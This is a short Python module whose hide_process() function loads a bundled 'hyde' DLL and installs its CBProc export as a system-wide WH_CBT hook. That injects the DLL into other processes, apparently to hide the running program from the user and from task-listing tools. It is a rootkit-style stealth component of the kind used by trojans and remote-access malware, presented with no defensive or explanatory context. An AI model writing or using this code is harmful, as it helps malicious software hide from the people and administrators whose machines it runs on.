import ctypes
import platform
import win32api
import win32con
from ctypes import wintypes

def hide_process():
    is_64bit_os = platform.machine().endswith('64')
    ptr_size = ctypes.sizeof(ctypes.c_void_p)

    if is_64bit_os and ptr_size != 4:
        hMod = win32api.LoadLibrary('resources/modules/hyde64.dll')
    elif not is_64bit_os and ptr_size == 4:
        hMod = win32api.LoadLibrary('resources/modules/hyde.dll')
    else: return False

    if hMod:
        CBProc_addr = win32api.GetProcAddress(hMod, 'CBProc')
        if not CBProc_addr: return False

        CBProc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)(CBProc_addr)

        WH_CBT = win32con.WH_CBT
        hMod_cast = ctypes.cast(hMod, wintypes.HMODULE)
        hHook = ctypes.windll.user32.SetWindowsHookExW(WH_CBT, CBProc, hMod_cast, 0)
        if not hHook: return False
    else: return False
    return True